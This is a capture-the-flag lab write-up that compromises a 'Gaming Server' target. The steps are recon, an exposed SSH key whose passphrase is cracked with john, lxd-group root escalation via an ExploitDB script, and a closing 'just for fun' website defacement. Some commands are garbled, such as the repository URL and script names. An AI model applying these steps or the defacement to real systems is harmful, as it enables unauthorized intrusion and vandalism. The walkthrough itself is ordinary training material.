# TItle: Gaming Server

**Difficulty:** Easy

**Category:** Red

## 1. Recon

I launched an Nmap scan against the target to find out which ports and services are running

```bash
nmap -sV <target-ip>
```

![alt text](pics/nmap.png)

Since apache is running, I opened the targets website and was greeted with a website of an RPG game

![alt text](pics/WEB1.png)

I came across an upload element while scrolling on the website. First think I thought I might be able to take advantage of an upload vulnerability, but when clicking it I was greeted with a directory listing.

![alt text](pics/scroll.png)

![alt text](pics/directory.png)

Looking through the directory, theres a file called dict.ls so I downloaded it

```bash
wget http://<target-ip>/uploads/dict.lst
```

The file contains a bunch of random words that seemed to be a wordlist, suggesting we might be needing it to bruteforce something so let us keep this file in mind for now.

![alt text](pics/wordlist.png)

Went back on exploring the website and find something interesting in the website's source code mentioning a developer named "john", suggesting that a user named john could be used when logging in through ssh later.

![alt text](pics/john.png)

## 2. Directory Enumeration

I ran gobuster against the target website to check for hidden endpoints in the website

```bash
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://target-ip/
```

After fuzzing it gave us another directory called secret

![alt text](pics/secret.png)

We are greeted with another directory but this time it has an RSA key in it so of course I downloaded it to my machine.

```bash
wget http://target-ip/secret/secretKey
```

![alt text](pics/rsa.png)

## 3. Exploitation

Since we have the key and a username, we can now try loggin in via ssh

![alt text](pics/attempt.png)

We cannot log in yet since the RSA key is protected with a passphrase. Let us try bruteforcing it with john the ripper

First let us convert the rsa keys content to a hash john the ripper can understand

```bash
ssh2john secretKey > hashedkey
```

After that we can now bruteforce the converted hash still using john the ripper

```bash
john --wordlist=/usr/share/wordlists/password/rockyou.txt hashedkey
```

We are then given with the passphrase "letmein" and we've successfully logged in.

![alt text](pics/logged.png)

## 4. Retrieving the flag and Priviledge Escalation

We can now retrieve the user flag in the directory we landed

![alt text](pics/user.png)

After checking the user identifier, it turns out our user is a member of lxd group which is a linux container.

![alt text](pics/lxd.png)

Theres a well known priviledge exploit regarding lxd that is already available in the internet so let us use that instead

First is to download the lxd alpine builder repository to your own machine since we'll be needing it for later.

```bash
git clone https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine.git
```

After downloading the repository cd into the alpine directory and run the bash script called "build-alpha"

```bash
chmod +x build-alpha
./build-alpha
```

Once that is done bulding we are then given a tar.gz file. Next is to send it to the target machine, to make it quick let is just use SCP.

```bash
scp -i secretKey /home/myname/Documents/ctf/gamingserver/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz john@target-ip:/tmp
```

![alt text](pics/scp.png)

Lets go back to the targets machine, go to /tmp directory and create a bash script with the exploit. I got the exploit from exploit.db

```link
https://www.exploit-db.com/exploits/46978
```

Go to ExploitDB and copy the scripts content.

![alt text](pics/exploitdb.png)

Create a a bash script file in the /tmp directory and paste the script.

![alt text](pics/paste.png)

Change the bash scripts permission to executable.

```bash
chmod +x exploit.sh
```

Then run

```bash
./exploit.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
```

We now have root access

![alt text](pics/escalate.png)

## 5. Retrieving the root flag.

Let us first find the root flags directory

```bash
find | grep root.txt
```

We got the directory

![alt text](pics/txt.png)

We now got the root flag

![alt text](pics/retrieve.png)

# Additional (Defacement)

Just for fun let us deface the website since we already have root.

Go to /mnt/root/var/www/html directory.

```bash
cd /mnt/root/var/www/html
```

rename index.html to index.html.old

```bash
mv index.html index.html.old
```

![alt text](pics/rename.png)

let us create a new index.html with our customized html code in it

```
touch index.html
echo " HTML CONTENTS " > index.html
```

![alt text](pics/touch.png)

We now have successfully defaced a website.

![alt text](pics/defacement.png)